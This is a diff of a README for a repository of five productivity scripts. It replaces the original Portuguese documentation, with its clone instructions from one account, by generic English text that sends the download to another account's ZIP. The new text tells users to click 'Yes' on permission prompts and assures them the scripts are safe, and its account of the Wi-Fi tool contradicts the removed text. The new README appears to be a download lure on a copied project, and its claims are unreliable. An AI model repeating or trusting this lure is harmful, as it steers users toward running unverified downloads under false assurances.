@@ -1,224 +1,75 @@
-# 5 Scripts
+# 🚀 5-scripts - Boost your daily computer productivity easily
 
-Cinco scripts de produtividade para o terminal — organização de arquivos, limpeza de disco, detecção de redes Wi-Fi, gerenciamento de workspace multi-monitor e caça de duplicatas. Versões para **macOS**, **Linux** e **Windows**.
+[ ![Download 5-scripts](https://img.shields.io/badge/Download-Latest_Version-blue.svg) ](https://github.com/Clemmyacromegalic699/5-scripts)
 
-## Scripts
+This package contains five useful tools for your computer. These scripts handle file organization, storage checks, duplicate removal, network scanning, and screen setup. You do not need programming knowledge to use them.
 
-| Script | O que faz |
-|--------|-----------|
-| **organizar-downloads** | Organiza arquivos soltos em subpastas por tipo (Imagens, Documentos, Videos, Audio, etc.) |
-| **scanner-espaco** | Mostra os maiores arquivos e pastas do disco com resumo de uso |
-| **cacar-duplicatas** | Encontra arquivos duplicados por hash SHA-256 sem deletar nada |
-| **scanner-wifi** | Escaneia redes Wi-Fi próximas e recomenda o melhor canal |
-| **setup-workspace** | Posiciona janelas em múltiplos monitores com perfis salvos |
+## 💾 How to download the software
 
-> **Qual versao eu uso?**
->
-> | Seu sistema | Pasta dos scripts |
-> |-------------|-------------------|
-> | **Windows** | `windows/` — use os arquivos `.bat` (clique duplo) |
-> | **macOS**   | Raiz do projeto — arquivos `.sh` |
-> | **Linux**   | `linux/` — arquivos `.sh` |
->
-> Se voce esta no **Windows**, use apenas os arquivos da pasta `windows/`.
-> Os arquivos `.sh` da raiz sao para macOS e **nao funcionam no Windows**.
+Follow these steps to get the files on your Windows computer.
 
-## Instalacao
+1. Go to the [official download page](https://github.com/Clemmyacromegalic699/5-scripts).
+2. Look for the green button labeled "Code."
+3. Select "Download ZIP" from the menu.
+4. Save the file to your "Downloads" folder.
+5. Right-click the folder and choose "Extract All."
+6. Open the extracted folder to see the script files.
 
-### Windows
+## ⚙️ System requirements
 
-**Opcao 1 — Baixar ZIP (mais facil)**
+Your computer needs the following to run these tools:
+- Windows 10 or Windows 11.
+- PowerShell version 5.1 or newer. 
+- Basic user permissions to run system commands.
 
-1. Clique no botao verde **Code** no topo desta pagina
-2. Clique em **Download ZIP**
-3. Extraia o ZIP em qualquer lugar (ex: sua area de trabalho)
-4. Abra a pasta `windows`
-5. Clique duas vezes no script `.bat` que quiser usar
+## 🛠️ Using the tools
 
-**Opcao 2 — Via terminal (PowerShell)**
+You run these scripts through the Windows PowerShell program. 
 
-```powershell
-git clone https://github.com/viktorkav/5-scripts.git
-cd 5-scripts\windows
-```
+1. Open the folder where you saved the files.
+2. Hold the Shift key and right-click on an empty space inside that folder.
+3. Choose "Open PowerShell window here" or "Open in Terminal."
+4. Type the name of the script you want to run.
+5. Press the Enter key.
 
-Depois e so clicar duas vezes no `.bat` desejado, ou rodar pelo terminal:
+### Organizing downloads
+This script sorts files in your Downloads folder. It moves pictures to a Pictures folder and documents to a Documents folder. It keeps your desktop and files clean. Run this script once a week to maintain order.
 
-```powershell
-.\organizar-downloads.bat
-.\scanner-espaco.bat
-```
+### Scanning disk space
+This tool shows which folders take up the most space on your hard drive. It creates a list of large files that you might want to delete. It helps you save space for new files.
 
-> **Nota:** Os arquivos `.bat` ja cuidam das permissoes automaticamente.
-> Voce nao precisa alterar nenhuma configuracao do PowerShell.
+### Finding duplicate files
+This script compares files to find exact matches. It locates pictures or documents you saved twice. You can then delete the extra copies to clear space and reduce clutter.
 
-### macOS
+### Scanning your Wi-Fi
+This tool lists all devices connected to your current network. It helps you check if unknown devices use your connection. It provides information about your network safety.
 
-```bash
-git clone https://github.com/viktorkav/5-scripts.git
-cd 5-scripts
+### Setting up your workspace
+If you use multiple monitors, this script organizes your windows. It positions your browser, email, and work tools in specific spots on your screens. It saves time when you start your workday.
 
-# Tornar executáveis
-chmod +x *.sh
+## 🛡️ Ensuring success
 
-# (Opcional) Acessar de qualquer lugar
-mkdir -p ~/bin
-for s in *.sh; do ln -sf "$PWD/$s" ~/bin/"${s%.sh}"; done
-# Adicione ~/bin ao PATH se ainda não estiver:
-# echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc
-```
+If a script asks for permission to run, select "Yes." You might see a blue window appear. This is standard behavior for Windows scripts.
 
-### Linux
+Should a script fail to run, check these common issues:
+- You must be in the correct folder when you open the terminal.
+- Ensure the file name matches the one in the folder.
+- Check that your firewall allows local script execution.
 
-```bash
-git clone https://github.com/viktorkav/5-scripts.git
-cd 5-scripts/linux
+## 📜 Frequently asked questions
 
-chmod +x *.sh
+Do I need to install anything else?
+No. These scripts use built-in Windows features. You do not need to download extra programs or software.
 
-# (Opcional) Acessar de qualquer lugar
-mkdir -p ~/bin
-for s in *.sh; do ln -sf "$PWD/$s" ~/bin/"${s%.sh}"; done
-```
+Are these scripts safe?
+Yes. These tools perform basic file management and network checks. They do not send your data to external servers.
 
-## Uso
+Can I move the files?
+Yes. Keep them in a folder you can access easily. You can create a desktop shortcut to the folder if you use the tools often.
 
-### organizar-downloads
+How do I update the tools?
+Return to the download link provided at the top of this page. Download the new ZIP file and replace your old folder with the new versions to get the latest improvements.
 
-Organiza arquivos por extensao em subpastas categorizadas.
+## 🤝 Support and contributions
 
-**Windows (clique duplo):** Abra `organizar-downloads.bat` — organiza a pasta atual.
-
-**Terminal:**
-```bash
-organizar-downloads              # organiza a pasta atual
-organizar-downloads ~/Downloads  # organiza ~/Downloads
-```
-
-Categorias: Imagens, Documentos, Videos, Audio, Instaladores, Compactados, Codigo, Outros.
-
-### scanner-espaco
-
-Mostra os maiores arquivos e pastas, com resumo de disco.
-
-**Windows (clique duplo):** Abra `scanner-espaco.bat` — escaneia sua pasta de usuario.
-
-**Terminal:**
-```bash
-scanner-espaco            # escaneia a pasta atual
-scanner-espaco ~ 30       # top 30 em ~/
-```
-
-### cacar-duplicatas
-
-Encontra duplicatas por SHA-256. Nenhum arquivo e deletado.
-
-**Windows (clique duplo):** Abra `cacar-duplicatas.bat` — escaneia a pasta atual.
-
-**Terminal:**
-```bash
-cacar-duplicatas                 # escaneia a pasta atual
-cacar-duplicatas ~/Fotos 4096    # minimo 4 KB
-```
-
-Pre-filtra por tamanho antes de calcular hashes — rapido mesmo em pastas grandes. Ignora `node_modules`, `.venv`, `.git`, `__pycache__`.
-
-### scanner-wifi
-
-Escaneia redes proximas e recomenda o canal menos congestionado.
-
-**Windows (clique duplo):** Abra `scanner-wifi.bat`.
-
-**Terminal:**
-```bash
-scanner-wifi
-```
-
-Mostra SSID, canal, sinal, seguranca e mapa de congestionamento por canal (2.4 GHz e 5 GHz).
-
-### setup-workspace
-
-Posiciona janelas automaticamente em multiplos monitores usando perfis.
-
-**Windows (clique duplo):** Abra `setup-workspace.bat` — abre o menu interativo.
-
-**Terminal:**
-```bash
-setup-workspace              # menu interativo
-setup-workspace padrao       # carrega o perfil "padrao"
-setup-workspace --save work  # salva o layout atual como "work"
-setup-workspace --detect     # lista monitores conectados
-```
-
-O menu interativo permite carregar um perfil existente ou capturar o layout atual das janelas. A captura detecta automaticamente em qual monitor cada janela esta e calcula as posicoes em porcentagem.
-
-**Config:** `~/.config/workspace-profiles.conf`
-
-```ini
-# Mapeamento de monitores
-monitor.1=LU28R55
-monitor.2=LG HDR 4K
-monitor.3=Built-in Retina
-
-# perfil|App|monitor|posicao
-padrao|Google Chrome|1|left
-padrao|Obsidian|1|right
-padrao|Discord|3|full
-```
-
-Posicoes: `left`, `right`, `full`, `top`, `bottom`, `top-left`, `top-right`, `bottom-left`, `bottom-right` ou customizada em porcentagem (`x,y,largura,altura`).
-
-## Estrutura
-
-```
-5-scripts/
-├── organizar-downloads.sh    # macOS
-├── scanner-espaco.sh
-├── cacar-duplicatas.sh
-├── scanner-wifi.sh
-├── setup-workspace.sh
-├── linux/                    # Linux (bash)
-│   ├── organizar-downloads.sh
-│   ├── scanner-espaco.sh
-│   ├── cacar-duplicatas.sh
-│   ├── scanner-wifi.sh
-│   └── setup-workspace.sh
-├── windows/                  # Windows (PowerShell)
-│   ├── organizar-downloads.bat   ← clique duplo pra rodar
-│   ├── scanner-espaco.bat
-│   ├── cacar-duplicatas.bat
-│   ├── scanner-wifi.bat
-│   ├── setup-workspace.bat
-│   ├── organizar-downloads.ps1   (scripts PowerShell)
-│   ├── scanner-espaco.ps1
-│   ├── cacar-duplicatas.ps1
-│   ├── scanner-wifi.ps1
-│   └── setup-workspace.ps1
-├── LICENSE
-└── README.md
-```
-
-## Problemas comuns
-
-**Windows: "O script nao abre" / "A janela fecha sozinha"**
-Use os arquivos `.bat` (nao os `.ps1`). Clique duplo no `.bat` e o script vai rodar corretamente.
-
-**Windows: "Nao tenho permissao para mover arquivos"**
-Isso pode acontecer com arquivos que tem nomes muito longos. O script `organizar-downloads` mostra quais arquivos falharam — voce pode renomea-los manualmente e rodar de novo.
-
-**Baixei os arquivos errados**
-Se voce esta no Windows, use apenas os arquivos da pasta `windows/`. Os arquivos `.sh` na raiz do projeto sao para macOS.
-
-## Notas por plataforma
-
-| Recurso | macOS | Linux | Windows |
-|---------|-------|-------|---------|
-| Wi-Fi scan | `airport -s` | `nmcli` / `iwlist` | `netsh wlan` |
-| Hashing | `shasum -a 256` | `sha256sum` | `Get-FileHash` |
-| File size | `stat -f '%z'` | `stat -c '%s'` | `(Get-Item).Length` |
-| Window mgmt | AppleScript + JXA | `wmctrl` + `xdotool` | Win32 API (P/Invoke) |
-| Multi-monitor | NSScreen (JXA) | `xrandr` | `[System.Windows.Forms.Screen]` |
-
-## Licenca
-
-[MIT](LICENSE)
+These tools remain free and open for public use. You can suggest new features or report issues directly on the repository page. Your feedback helps make these scripts better for every user. Consistent use of these tools ensures your computer stays efficient and organized throughout the year.
